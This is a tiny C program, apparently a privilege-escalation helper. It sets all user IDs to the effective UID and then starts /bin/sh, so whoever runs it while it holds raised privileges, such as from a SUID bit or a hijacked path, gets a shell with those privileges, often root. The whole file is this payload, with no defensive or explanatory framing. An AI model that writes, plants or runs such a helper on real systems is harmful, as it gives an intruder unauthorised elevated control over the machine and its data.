#include<stdio.h>

int main(void) {
    setresuid(geteuid(), geteuid(), geteuid());
    system("/bin/sh");
    return 0;
}
